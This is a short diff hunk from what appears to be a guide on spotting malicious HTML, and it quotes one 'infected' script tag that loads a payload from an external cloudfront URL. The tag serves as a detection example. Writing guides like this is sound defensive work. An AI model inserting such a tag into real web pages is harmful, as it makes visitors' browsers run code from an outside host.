@@ -42,3 +42,4 @@ Malicious HTML often hides `<script>` tags that load external payloads (for exam
 Example of an infected tag:
 ```html
 <script src="https://d1owuvqs9tkert.cloudfront.net/?vuwod=1252956"></script>
+
